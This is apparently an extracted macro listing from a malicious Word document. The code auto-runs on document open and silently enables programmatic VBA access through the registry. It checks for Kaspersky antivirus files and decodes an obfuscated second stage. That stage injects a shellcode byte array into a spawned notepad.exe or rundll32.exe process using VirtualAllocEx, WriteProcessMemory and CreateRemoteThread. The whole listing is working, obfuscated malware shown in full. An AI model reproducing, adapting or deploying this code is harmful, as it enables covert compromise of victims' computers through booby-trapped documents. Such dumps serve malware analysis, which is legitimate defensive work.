===============================================================================
FILE: .\700db4ae28f53782d239e83db189c7c956b06f61e04cb4a55ff4bc759faa170e.bin
Type: OLE

Option Explicit
Private Sub Document_Open()
 Application.Run ("Start.Work")
End Sub

Sub Pick()
 Application.Run ("Windows.Continue")
End Sub

Sub Work()
 Application.Run ("Apply.Pick")
End Sub

Sub Continue()
 Application.Run ("SmartWork.SmartWork")
End Sub

Option Explicit
Private Declare PtrSafe Function CreateMutex Lib "kernel32" Alias "CreateMutexA" (ByVal lpMutexAttributes As Long, ByVal bInitialOwner As Long, ByVal lpName As String) As Long
Private Mut As Long
Private Function fl_Error() As Boolean
 On Error GoTo Erreur
 'Dim codeModule As Object
 'Set codeModule = ThisDocument.VBProject.VBComponents
 fl_Error = True
 Exit Function
 Erreur:
 fl_Error = False
End Function
Private Sub WriteReg(newValue As Integer)
 Dim shobj As Object
 Dim subKey As String
 Set shobj = CreateObject(Chr$(87) & "Script.shell")
 subKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\" & Chr$(87) & "ord\Security\AccessVBOM"
 shobj.RegWrite subKey, newValue, "REG_DWORD"
End Sub
Private Sub InitMutex()
 Mut = CreateMutex(0, 1, "sensiblemtv16n") ' -> just {$val} + "n"
 Dim er As Long: er = Err.LastDllError
 If er <> 0 Then
 Application.DisplayAlerts = False
 Application.Quit
 Else
 End If
End Sub

Public Function Decode(Arg1 As String) As String
 Dim Ar1 As String, Ar2 As String
 Ar1 = "BU+13r7JX9A)dwxvD5h 2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V&tC,uYz=Z0RS8aM4Fqn"
 Ar2 = "v&tC,uYz=Z0RS8aM4FqnD5h 2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V7JX9A)dwxBU+13r"
 Dim r As String, i , j , lim
 lim = Len(Ar2)
 For i = 1 To Len(Arg1)
 Dim t As String
 t = Mid(Arg1, i, 1)
 For j = 1 To Len(Ar2)
 Dim t2 As String
 t2 = Mid(Ar2, j, 1)
 If t = t2 Then
 r = r & Mid(Ar1, j, 1)
 Exit For
 End If
 Next j
 If j > lim Then
 r = r & t
 End If
 Next i
 Decode = r
End Function

Private Sub SmartWork()
  On Error GoTo Erreur
  Dim c, scriptObj As Object, path1 As String, path2 As String, path3 As String, base
  c = fl_Error
  If c Then
  Dim val As String
  val = Init()
  If val = "" Then
  Exit Sub
  End If
  Set scriptObj = CreateObject("Scripting.FileSystemObject") 
  base = "pQFqnD5h 2WOGfbmNyi*IKP7JX9A)dcLelj(kETogHs.#wxBU+13rv&6VtC,uYz=Z0RS8aM4"
  path1 = "C:\Windows\"
  path1 = path1 & Mid(base, 70, 1)
  path1 = path1 & Mid(base, 54, 1)
  path1 = path1 & Mid(base, 1, 1)
  path1 = path1 & Mid(base, 44, 1)
  path1 = path1 & Mid(base, 33, 1)
  path1 = path1 & Mid(base, 47, 1)
  path1 = path1 & Mid(base, 33, 1) ' -> C:\Windows\avp.exe
  path2 = "C:\Windows\"
  path2 = path2 & Mid(base, 22, 1)
  path2 = path2 & Mid(base, 70, 1)
  path2 = path2 & Mid(base, 54, 1)
  path2 = path2 & Mid(base, 43, 1)
  path2 = path2 & Mid(base, 54, 1)
  path2 = path2 & Mid(base, 31, 1)
  path2 = path2 & Mid(base, 44, 1)
  path2 = path2 & Mid(base, 33, 1)
  path2 = path2 & Mid(base, 47, 1)
  path2 = path2 & Mid(base, 33, 1) ' -> C:\Windows\Kavsvc.exe
  path3 = "C:\Windows\"
  path3 = path3 & Mid(base, 31, 1)
  path3 = path3 & Mid(base, 34, 1)
  path3 = path3 & Mid(base, 19, 1)
  path3 = path3 & Mid(base, 43, 1)
  path3 = path3 & Mid(base, 54, 1)
  path3 = path3 & Mid(base, 33, 1)
  path3 = path3 & Mid(base, 44, 1)
  path3 = path3 & Mid(base, 33, 1)
  path3 = path3 & Mid(base, 47, 1)
  path3 = path3 & Mid(base, 33, 1) ' -> C:\Windows\clisve.exe
  If Not scriptObj.FileExists(path1) Or scriptObj.FileExists(path2) Or scriptObj.FileExists(path3) Then
  RunPay val
  End If
  ThisDocument.Saved = True
  InitMutex
  Else
  WriteReg (1)
  InitMutex
  Dim doc As String
  Dim App As Word.Application
  Set App = CreateObject(Chr$(87) & "ord.Application") ' -> Word.Application
  doc = ThisDocument.FullName
  App.Visible = False
  App.Documents.Open doc, ReadOnly:=True
  End If
  Erreur:
  Exit Sub
End Sub

Private Sub RunPay(Arg1 As String)
 Dim p As String
 Dim shName As String
 p = Decode(Arg1)
 Dim nbrLigne As Long
 nbrLigne = 2
 Dim vbPro
 Set vbPro = ThisDocument.VBProject
 shName = vbPro.VBComponents.Add(1).Name
 With ActiveDocument.VBProject.VBComponents(shName).codeModule
 .InsertLines nbrLigne, p
 End With
 Dim n As String
 n = shName & ".main"
 Application.Run (n)
End Sub

Private Function Init() As String
 Dim str As String
 str = "2hTslrnyahPsmsT" & vbCrLf
 str = str & "g#pnIv0YniqKr" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrnIsuT7BP0PPlmyanNsQn" & Chr(34) & "eKurKP,DoSPP" & Chr(34) & "nLvHIBPnqbulmKkkn0knNlrjbTuVnPh0SSuKkkn0kn0rHVnvHIBPnS8wsXKn0knNlrjVnvHIBPnpP0PPlmBTslriHhKn0knNlrjVnvHIBPnpPbulTKmTn0knNlrjRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrn5usTKbulmKkkUKOluHnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnqbulmKkkn0knNlrjbTuVnvHIBPnPhvBkK0SSuKkkn0kn0rHVnvHIBPnPhv7ppKun0kn0rHVnvHIBPnrwsXKn0knNlrjbTuVnPhG7OQKu2pvHTKk5usTTKrn0knNlrjRn0knNlrj" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrn6PlkK(BrSPKnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnq2QcKmTn0knNlrjbTuRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrn2hKrbulmKkknNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnS84KksuKS0mmKkkn0knNlrjVnvHIBPnQ#rqKusT(BrSPKn0knNlrjVnvHIBPnS8bulmKkk#4n0knNlrjRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrndTPUlMKUKOluHnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPn4eqrkXlPn0knNlrjbTuVnvHdKpn58jTjHn0kn0rHVnvHIBPn(ueO7lkn0knNlrjbTuRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrn6uKBTKdKOlTKiquKBSnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnqbulmKkkn0knNlrjbTuVnPhiquKBS0TTusQ7TKkn0kn0rHVnvHIBPnS8wTBmewsXKn0knNlrjbTuVnvHIBPnPhwTBuT0SSuKkkn0knNlrjbTuVnPhbBuBOKTKun0kn0rHVnvHIBPnS86uKBTslr1PBjkn0knNlrjbTuVnPhiquKBS#4n0knNlrjRn0knNlrj" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrnWPlQBP0PPlmnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPn81PBjkn0knNlrjbTuVnvHIBPnS8vHTKkn0knNlrjbTuRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrnWPlQBP1uKKnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnqUKOn0knNlrjbTuRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrn6uKBTKbulmKkk0nNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnPh0hhPsmBTslrGBOKn0knNlrjVnvHIBPnPh6lOOBrSNsrKn0knwTusrjVnvHIBPnPhbulmKkk0TTusQ7TKkn0knNlrjVnvHIBPnPhiquKBS0TTusQ7TKkn0knNlrjVnvHIBPnQ#rqKusT(BrSPKkn0knNlrjVnvHIBPnS86uKBTslr1PBjkn0knNlrjVnvHIBPnPhyrMsulrOKrTn0knNlrjVnvHIBPnPh67uuKrT4suKmTluHn0knNlrjVnPhwTBuT7h#rpln0knwi0di&b#G12VnPhbulmKkk#rpluOBTslrn0knbd26yww_#G12dU0i#2GRn0knNlrjbTu" & vbCrLf
 str = str & "gyPkK" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKn17rmTslrnIsuT7BP0PPlmyanNsQn" & Chr(34) & "eKurKP,DoSPP" & Chr(34) & "nLvHIBPnqbulmKkkn0knNlrjVnPh0SSuKkkn0kn0rHVnvHIBPnS8wsXKn0knNlrjVnvHIBPnpP0PPlmBTslriHhKn0knNlrjVnvHIBPnpPbulTKmTn0knNlrjRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKn17rmTslrn5usTKbulmKkkUKOluHnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnqbulmKkkn0knNlrjVnvHIBPnPhvBkK0SSuKkkn0kn0rHVnvHIBPnPhv7ppKun0kn0rHVnvHIBPnrwsXKn0knNlrjVnPhG7OQKu2pvHTKk5usTTKrn0knNlrjRn0knNlrj" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKn17rmTslrn6PlkK(BrSPKnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnq2QcKmTn0knNlrjRn0knNlrj" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKn17rmTslrn2hKrbulmKkknNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnS84KksuKS0mmKkkn0knNlrjVnvHIBPnQ#rqKusT(BrSPKn0knNlrjVnvHIBPnS8bulmKkk#4n0knNlrjRn0knNlrj" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKn17rmTslrndTPUlMKUKOluHnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPn4eqrkXlPn0knNlrjVnvHdKpn58jTjHn0kn0rHVnvHIBPn(ueO7lkn0knNlrjRn0knNlrj" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKn17rmTslrn6uKBTKdKOlTKiquKBSnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnqbulmKkkn0knNlrjVnPhiquKBS0TTusQ7TKkn0kn0rHVnvHIBPnS8wTBmewsXKn0knNlrjVnvHIBPnPhwTBuT0SSuKkkn0knNlrjVnPhbBuBOKTKun0kn0rHVnvHIBPnS86uKBTslr1PBjkn0knNlrjVnPhiquKBS#4n0knNlrjRn0knNlrj" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrnWPlQBP0PPlmnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPn81PBjkn0knNlrjVnvHIBPnS8vHTKkn0knNlrjbTuRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKnbTuwBpKn17rmTslrnWPlQBP1uKKnNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnqUKOn0knNlrjbTuRn0knNlrjbTu" & vbCrLf
 str = str & "nnnnbusMBTKn4KmPBuKn17rmTslrn6uKBTKbulmKkk0nNsQn" & Chr(34) & "eKurKP,D" & Chr(34) & "nLvHIBPnPh0hhPsmBTslrGBOKn0knNlrjVnvHIBPnPh6lOOBrSNsrKn0knwTusrjVnvHIBPnPhbulmKkk0TTusQ7TKkn0knNlrjVnvHIBPnPhiquKBS0TTusQ7TKkn0knNlrjVnvHIBPnQ#rqKusT(BrSPKkn0knNlrjVnvHIBPnS86uKBTslr1PBjkn0knNlrjVnvHIBPnPhyrMsulrOKrTn0knNlrjVnvHIBPnPh67uuKrT4suKmTluHn0knNlrjVnPhwTBuT7h#rpln0knwi0di&b#G12VnPhbulmKkk#rpluOBTslrn0knbd26yww_#G12dU0i#2GRn0knNlrj" & vbCrLf
 str = str & "gyrSn#p" & vbCrLf
 str = str & "busMBTKniHhKnwi0di&b#G12" & vbCrLf
 str = str & "mQn0knNlrj" & vbCrLf
 str = str & "PhdKkKuMKSn0knwTusrj" & vbCrLf
 str = str & "Ph4KkeTlhn0knwTusrj" & vbCrLf
 str = str & "PhisTPKn0knwTusrj" & vbCrLf
 str = str & "S8=n0knNlrj" & vbCrLf
 str = str & "S8Jn0knNlrj" & vbCrLf
 str = str & "S8=wsXKn0knNlrj" & vbCrLf
 str = str & "S8JwsXKn0knNlrj" & vbCrLf
 str = str & "S8=6l7rT6qBukn0knNlrj" & vbCrLf
 str = str & "S8J6l7rT6qBukn0knNlrj" & vbCrLf
 str = str & "S81sPP0TTusQ7TKn0knNlrj" & vbCrLf
 str = str & "S81PBjkn0knNlrj" & vbCrLf
 str = str & "8wql85srSl8n0kn#rTKjKu" & vbCrLf
 str = str & "mQdKkKuMKSDn0kn#rTKjKu" & vbCrLf
 str = str & "PhdKkKuMKSDn0knNlrj" & vbCrLf
 str = str & "qwTS#rh7Tn0knNlrj" & vbCrLf
 str = str & "qwTS27Th7Tn0knNlrj" & vbCrLf
 str = str & "qwTSyuulun0knNlrj" & vbCrLf
 str = str & "yrSniHhK" & vbCrLf
 str = str & "busMBTKniHhKnbd26yww_#G12dU0i#2G" & vbCrLf
 str = str & "qbulmKkkn0knNlrjbTu" & vbCrLf
 str = str & "qiquKBSn0knNlrjbTu" & vbCrLf
 str = str & "S8bulmKkk#4n0knNlrj" & vbCrLf
 str = str & "S8iquKBS#4n0knNlrj" & vbCrLf
 str = str & "yrSniHhK" & vbCrLf
 str = str & "b7QPsmnqiBujKTbulm(BrSPKn0knNlrjbTu" & vbCrLf
 str = str & "b7QPsmnS86lSKNKrn0knNlrj" & vbCrLf
 str = str & "b7QPsmnqiquKBSn0knNlrj" & vbCrLf
 str = str & "b7QPsmni#4n0knNlrj" & vbCrLf
 str = str & "b7QPsmnkqKPP0SSun0knNlrjbTu" & vbCrLf
 str = str & "busMBTKn6lrkTnWUyU_U2Iy0vNyn9nE(D" & vbCrLf
 str = str & "busMBTKn6lrkTnWUyU_Ayd2#G#in9nE(+)" & vbCrLf
 str = str & "busMBTKn6lrkTnW(G4n9nLWUyU_U2Iy0vNyn2unWUyU_Ayd2#G#iR" & vbCrLf
 str = str & "w7QnOBsrLR" & vbCrLf
 str = str & "nnnn6lrkTnwi0di1_&wyw(255#G425n9nE(C" & vbCrLf
 str = str & "nnnn6lrkTnw5_w(25n9nF" & vbCrLf
 str = str & "nnnn6lrkTnw5_(sSKn9n)" & vbCrLf
 str = str & "nnnn6lrkTnbd26yww_0NN_066ywwn9nE(C1)111" & vbCrLf
 str = str & "nnnn6lrkTnUyU_62UU#in9nE(C)))" & vbCrLf
 str = str & "nnnn6lrkTnUyU_dywydIyn9nE(D)))" & vbCrLf
 str = str & "nnnn6lrkTnUyU_dywyin9nE(x)))" & vbCrLf
 str = str & "nnnn6lrkTnb0Wy_y=y6&iy_dy045d#iyn9nE(+)" & vbCrLf
 str = str & "nnnn4sOnhulmn0knbd26yww_#G12dU0i#2G" & vbCrLf
 str = str & "nnnn4sOnb#4n0knNlrj" & vbCrLf
 str = str & "nnnn4sOnkum_kTun0knIBusBrT" & vbCrLf
 str = str & "kum_kTun9n0uuBHLE(FFVnE(xvVnE(y6VnE(x,VnE(y6VnE(D6VnE(F)VnE(yxVnE(+VnE()VnE()VnE()VnE(xFVnE(6)VnE(YFVnE(YVnE(xvVnE(+VnE(D+VnE(xZVnE(+FVnE(y6VnE(6,VnE(FxVnE(vZVnE(+6VnE(YYVnE(D*VnE(YVnE(yxVnE(6yVnE()VnE()VnE()VnE(xZVnE(+FVnE(1)VnE(vZVnE(FxVnE(0+VnE(F,VnE(yFVnE(yxVnE(6CVnE()VnE()VnE()VnE(xZVnE(+FVnE(1+VnE(*0VnE(+)VnE(*xVnE()VnE(C)VnE()VnE()VnE(*xVnE()VnE()VnE(0)VnE()VnE(*0VnE()Vn_" & vbCrLf
 str = str & "E(11VnE(FFVnE(1+VnE(xZVnE(+FVnE(16VnE(6YVnE(+FVnE(4+VnE(YYVnE(*ZVnE(*yVnE(*ZVnE(6YVnE(+FVnE(4xVnE(*yVnE(*FVnE(Y+VnE(DyVnE(6YVnE(+FVnE(46VnE(*+VnE(*6VnE(*6VnE()VnE(x,VnE(*FVnE(y)VnE()VnE(x4VnE(+FVnE(4+VnE(F)VnE(11VnE(FFVnE(1)VnE(xvVnE(+FVnE(y6VnE(FVnE(ZCVnE(CDVnE(0DVnE()VnE(D4VnE()VnE(C)VnE(0DVnE()VnE(x,VnE(yxVnE(6VnE(xZVnE(+FVnE(yxVnE(xvVnE(FFVnE(16VnE(xvVnE(+4VnE(yxVnE(yxVn_" & vbCrLf
 str = str & "E(*CVnE(CVnE()VnE()VnE(xZVnE(+FVnE(1xVnE(x,VnE(Y4VnE(1xVnE()VnE(Y+VnE(6VnE(xvVnE(+4VnE(16VnE(yxVnE(,CVnE()VnE()VnE()VnE(xFVnE(6)VnE(YFVnE(DVnE(yvVnE(CFVnE(xvVnE(FFVnE(1xVnE(xvVnE(+4VnE(16VnE(yxVnE(6VnE()VnE()VnE()VnE(xvVnE(+FVnE(16VnE(+)VnE(xZVnE(+FVnE(y+VnE(11VnE(FFVnE(y+VnE(6ZVnE(6,VnE(F*VnE(,,VnE(1*VnE(+*VnE(,vVnE(4*VnE(Y*VnE(0VnE(x0VnE(CVnE(,)VnE(+VnE(yVnE(+*Vn_" & vbCrLf
 str = str & "E(,vVnE(1DVnE(YDVnE(1*VnE(FyVnE(6,VnE(x)VnE(,ZVnE(,6VnE(YFVnE(DCVnE(x)VnE(YZVnE(CVnE(,1VnE(YFVnE(CvVnE(x)VnE(YZVnE(DVnE(YxVnE(YFVnE(CFVnE(x)VnE(YZVnE(,VnE(*4VnE(YFVnE(1VnE(x)VnE(YZVnE(+VnE(*6VnE(YFVnE(ZVnE(x)VnE(YZVnE(FVnE(D)VnE(YFVnE(,VnE(,,VnE(6)VnE(6,VnE(,,VnE(6)VnE(+)VnE(6,VnE(FFVnE(xvVnE(y6VnE(x,VnE(y6VnE(C6VnE(*+VnE(0CVnE(,)VnE()VnE()VnE()VnE(F,VnE(F*VnE(FYVnE(xvVn_" & vbCrLf
 str = str & "E(+)VnE(6VnE(xZVnE(+4VnE(y6VnE(xvVnE(YxVnE(6VnE(yZVnE(0YVnE()VnE()VnE()VnE(xvVnE(+YVnE(,)VnE(,,VnE(1*VnE(xvVnE(F1VnE(D6VnE(xvVnE(,1VnE(xZVnE(+FVnE(1xVnE(xvVnE(+DVnE(,6VnE(xZVnE(Y4VnE(1+VnE(xvVnE(++VnE(C)VnE(YxVnE(xZVnE(+FVnE(1)VnE(xFVnE(6)VnE(1VnE(x+VnE(xFVnE()VnE()VnE()VnE(6CVnE(yvVnE(C)VnE(,,VnE(6ZVnE(xFVnE(4vVnE(Y+VnE(D4VnE(xvVnE(Y4VnE(1xVnE(1VnE(vyVnE(C+VnE(1VnE(6CVn_" & vbCrLf
 str = str & "E(6yVnE(4VnE(x)VnE(,6VnE(1VnE(*CVnE(xZVnE(FFVnE(1xVnE(Y6VnE(ZVnE(xvVnE(6DVnE(x,VnE(6)VnE(y)VnE(,VnE(1)VnE(yvVnE(,VnE(,VnE(YFVnE(1xVnE(+CVnE(,vVnE(6vVnE(YDVnE(41VnE(xvVnE(FFVnE(16VnE(xvVnE(Y4VnE(1+VnE(xvVnE(+FVnE(1)VnE(xvVnE(+6VnE(C)VnE(CxVnE(,,VnE(4vVnE(xvVnE(++VnE(C)VnE(D)VnE(,VnE(6DVnE(xZVnE(+4VnE(yxVnE(xFVnE(6ZVnE(Y+VnE(,6VnE(xvVnE(xVnE(,,VnE(11VnE(,VnE(60VnE(x,VnE(6)Vn_" & vbCrLf
 str = str & "E(+VnE(xZVnE(+4VnE(1xVnE(xvVnE(4CVnE(xZVnE(+FVnE(y+VnE(x0VnE(0VnE(6CVnE(61VnE(4VnE(1VnE(vyVnE(6CVnE(,VnE(1xVnE(+DVnE(x+VnE(6ZVnE(YFVnE(1CVnE(xvVnE(FFVnE(16VnE(xZVnE(Y4VnE(1xVnE(xvVnE(+FVnE(1xVnE(xvVnE(Y4VnE(1+VnE(,VnE(6*VnE(,vVnE(+FVnE(y6VnE(Y+VnE(CyVnE(xvVnE(+FVnE(y+VnE(+,VnE(,vVnE(F4VnE(yxVnE(YDVnE(6+VnE(xvVnE(FYVnE(CxVnE(xZVnE(FFVnE(16VnE(xFVnE(4DVnE(1VnE(xFVnE(+vVnE(11Vn_" & vbCrLf
 str = str & "E(11VnE(11VnE(,,VnE(6)VnE(F1VnE(FyVnE(FvVnE(6ZVnE(6,VnE(xvVnE(YFVnE(1)VnE(xvVnE(++VnE(C*VnE(D+VnE(x4VnE(+VnE(FxVnE(1VnE(vYVnE(6VnE(C)VnE(xvVnE(++VnE(C*VnE(C6VnE(x4VnE(+VnE(xxVnE(xvVnE(+VnE(C)VnE(,VnE(6DVnE(yvVnE(41VnE(FFVnE(xvVnE(y6VnE(x,VnE(y6VnE(D+VnE(F,VnE(F*VnE(FYVnE(xZVnE(+4VnE(1xVnE(,,VnE(11VnE(vZVnE(,0VnE(F*VnE(YZVnE(0YVnE(xZVnE(FFVnE(1)VnE(xZVnE(Y4VnE(16VnE(6YVnE(+FVn_" & vbCrLf
 str = str & "E(46VnE(+4VnE(YZVnE(+CVnE(*YVnE(6YVnE(+FVnE(y)VnE(*FVnE(*yVnE(Y+VnE()VnE(yxVnE(41VnE(1yVnE(11VnE(11VnE(vZVnE(YYVnE(xYVnE(Y0VnE(1)VnE(xvVnE(1)VnE(yxVnE(4,VnE(1yVnE(11VnE(11VnE(vZVnE(CDVnE(Z*VnE(xZVnE(yDVnE(xZVnE(+FVnE(1+VnE(yxVnE(6*VnE(1yVnE(11VnE(11VnE(vZVnE(4,VnE(*vVnE(*yVnE(4+VnE(xZVnE(+FVnE(y6VnE(yxVnE(vZVnE(1yVnE(11VnE(11VnE(FYVnE(FYVnE(FYVnE(xvVnE(4xVnE(x4VnE(+FVnE(46VnE(FYVn_" & vbCrLf
 str = str & "E(F)VnE(xZVnE(F4VnE(yxVnE(11VnE(4*VnE(xZVnE(+FVnE(y+VnE(xFVnE(6)VnE(Y+VnE(,1VnE(FYVnE(*xVnE()VnE()VnE()VnE(x+VnE(FYVnE(FYVnE(11VnE(YFVnE(1xVnE(F)VnE(11VnE(FFVnE(1+VnE(xvVnE(1)VnE(xFVnE(1*VnE(Y+VnE(D,VnE(xvVnE(F4VnE(1)VnE(x4VnE(+FVnE(16VnE(F)VnE(*xVnE(4)VnE(YVnE()VnE()VnE(x4VnE(+VnE(C1VnE(F)VnE(F*VnE(11VnE(FFVnE(y6VnE(,VnE(Y4VnE(16VnE(x,VnE(Y4VnE(16VnE()VnE(YFVnE(y*VnE(xvVn_" & vbCrLf
 str = str & "E(F4VnE(yxVnE(F*VnE(11VnE(4,VnE(11VnE(YFVnE(y+VnE(11VnE(4,VnE(xvVnE(6YVnE(F1VnE(FyVnE(FvVnE(6ZVnE(6,VnE(*xVnE(Y+VnE(Y+VnE(Y)VnE(Y,VnE(,0VnE(D1VnE(D1VnE(*CVnE(Y)VnE(*ZVnE(DyVnE(*1VnE(*yVnE(*FVnE(*+VnE(YDVnE(*ZVnE(Y*VnE(*FVnE(DyVnE(*,VnE(*1VnE(*4VnE(D1VnE(Y*VnE(,CVnE(DyVnE(,)VnE(D1VnE(Y,VnE(*xVnE(*CVnE(YDVnE(*FVnE(Y,VnE(D1VnE(YFVnE(DCVnE(*CVnE(+xVnE(FDVnE(,)VnE(*,VnE(+xVnE(+4VnE(,*Vn_" & vbCrLf
 str = str & "E(+6VnE(YZVnE(,xVnE(YxVnE(F0VnE(+xVnE(+0VnE(,DVnE(+6VnE(*4VnE(,CVnE(Y0VnE(+6VnE(,,VnE(FFVnE(Y*VnE(*,VnE(YZVnE(+*VnE(+DVnE(*CVnE(*6VnE(F*VnE(YZVnE(F0VnE(++VnE(*6VnE(*1VnE(*+VnE(FFVnE(,CVnE(YYVnE(FFVnE(FYVnE(+yVnE(*0VnE(F+VnE(+YVnE(Y+VnE(,+VnE(*DVnE(FxVnE(*xVnE(+DVnE(F*VnE(,)VnE(Y)VnE(*0VnE(FCVnE(FFVnE(,CVnE(*0VnE(*CVnE(,DVnE(+4VnE(F1VnE(F0VnE(F+VnE(,CVnE(*4VnE(FFVnE(*yVnE(*,VnE(,+Vn_" & vbCrLf
 str = str & "E(F*VnE(+xVnE(*YVnE(D1VnE(YDVnE(*1VnE(*1VnE(Y+VnE(D1VnE(*,VnE(*1VnE(*yVnE(Y+VnE(*FVnE(*yVnE(Y+VnE()R" & vbCrLf
 str = str & "4sOnkTBuTn0knwi0di&b#G12" & vbCrLf
 str = str & "nnnn4sOndKT7urIBP7Kn0knNlrjbTu" & vbCrLf
 str = str & "nnnn4sOnuKTn0knNlrj" & vbCrLf
 str = str & "nnnn4sOnqiquKBS#4n0knNlrj" & vbCrLf
 str = str & "nnnnkTBuTomQn9nNKrLkTBuTR" & vbCrLf
 str = str & "nnnnkTBuToS81PBjkn9nwi0di1_&wyw(255#G425" & vbCrLf
 str = str & "nnnnkTBuTo8wql85srSl8n9nw5_(sSK" & vbCrLf
 str = str & "nnnn4sOnqWPlQBPUKOluHn0knNlrjbTuVnsn0knNlrj" & vbCrLf
 str = str & "nnnn4sOnQIBP7Kn0knNlrj" & vbCrLf
 str = str & "nnnn4sOnQ#k*+vsTn0knvllPKBr" & vbCrLf
 str = str & "nnnng#pn5sr*+niqKr" & vbCrLf
 str = str & "nnnnnnnn4sOn1w2n0kn2QcKmT" & vbCrLf
 str = str & "nnnnnnnnwKTn1w2n9n6uKBTK2QcKmTL" & Chr(34) & "wmushTsrjo1sPKwHkTKO2QcKmT" & Chr(34) & "R" & vbCrLf
 str = str & "nnnnnnnn4sOn8srSl8k4sun0knwTusrj" & vbCrLf
 str = str & "nnnnnnnn8srSl8k4sun9n1w2oWKTwhKmsBP1lPSKuL)R" & vbCrLf
 str = str & "nnnnnnnn8srSl8k4sun9n8srSl8k4sunEn" & Chr(34) & "\wHk525*+\rlTKhBSoKaK" & Chr(34) & "" & vbCrLf
 str = str & "nnnnnnnndKT7urIBP7Kn9n6uKBTKbulmKkk0L)Vn8srSl8k4suVn)Vn)Vn1BPkKVn)Vn)Vn)VnkTBuTVnhulmR" & vbCrLf
 str = str & "nnnngyPkK" & vbCrLf
 str = str & "nnnnnnnndKT7urIBP7Kn9n6uKBTKbulmKkk0L)Vn" & Chr(34) & "rlTKhBSoKaK" & Chr(34) & "Vn)Vn)Vn1BPkKVn)Vn)Vn)VnkTBuTVnhulmR" & vbCrLf
 str = str & "nnnngyrSn#p" & vbCrLf
 str = str & "nnnnb#4n9nhulmoS8bulmKkk#4" & vbCrLf
 str = str & "nnnn#pnb#4niqKrnqiBujKTbulm(BrSPKn9n2hKrbulmKkkLbd26yww_0NN_066ywwVn1BPkKVnb#4RnyPkKnyasTnw7Q" & vbCrLf
 str = str & "nnnnS86lSKNKrn9nE(x))" & vbCrLf
 str = str & "nnnnkqKPP0SSun9nIsuT7BP0PPlmyaLqiBujKTbulm(BrSPKVnvHIBPn)VnS86lSKNKrVnE(,)))Vnb0Wy_y=y6&iy_dy045d#iyR" & vbCrLf
 str = str & "nnnnqWPlQBPUKOluHn9nWPlQBP0PPlmLW(G4Vn&vl7rSLkum_kTuRRnnnn" & vbCrLf
 str = str & "nnnn1lunsn9nNvl7rSLkum_kTuRniln&vl7rSLkum_kTuR" & vbCrLf
 str = str & "nnnnnnnnQIBP7Kn9nkum_kTuLsR" & vbCrLf
 str = str & "nnnnnnnndTPUlMKUKOluHnqWPlQBPUKOluHntnsVnQIBP7KVnC" & vbCrLf
 str = str & "nnnnGKaTns" & vbCrLf
 str = str & "nnnn4sOnuKk7PT5usTKbulmKkk" & vbCrLf
 str = str & "nnnnuKk7PT5usTKbulmKkkn9n5usTKbulmKkkUKOluHLqiBujKTbulm(BrSPKVnkqKPP0SSuVnqWPlQBPUKOluHVn&vl7rSLkum_kTuRntnCVnuKTR" & vbCrLf
 str = str & "nnnnqiquKBSn9n6uKBTKdKOlTKiquKBSLqiBujKTbulm(BrSPKVnvHIBPn)Vn)VnkqKPP0SSuVn)Vn)Vn)R" & vbCrLf
 str = str & "yrSnw7Q" & vbCrLf

 Init = str
End Function

'============ In memory exec ================
Option Explicit
#If VBA7 Then
 Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32.dll" (ByVal hProcess As LongPtr, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As Any, ByVal lpBuffer As Any, ByVal nSize As LongPtr, lpNumberOfBytesWritten As Long) As Long
 Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As LongPtr
 Private Declare PtrSafe Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As LongPtr
